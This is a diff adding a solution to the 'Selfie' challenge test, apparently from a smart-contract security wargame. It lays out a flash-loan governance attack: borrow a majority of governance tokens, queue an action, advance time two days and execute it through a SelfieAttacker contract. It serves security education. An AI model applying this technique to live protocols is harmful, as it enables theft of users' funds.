@@ -39,6 +39,25 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Plan
+        // 1. Take a flash loan out for more than 50% of available tokens
+        // 2. While the flash loan is taken out we queue an action on the 
+        //    governance smart contract. The queueAction method on the governance
+        //    smart contract checks if the attacker smart contract has more than
+        //    50% of the supply to be able to have the power to queueAction
+        // 3. Increase the time by 2 days since the governance smart contact has a
+        //    "cool down" period of 2 days before queued actions can be executed on
+        // 4. Finally execute the action that was queued
+
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player))
+            .deploy(pool.address, governance.address, token.address);
+        await attacker.attack();
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        const action_number = await governance.getActionCounter() - 1;
+        await governance.executeAction(action_number);
     });
 
     after(async function () {
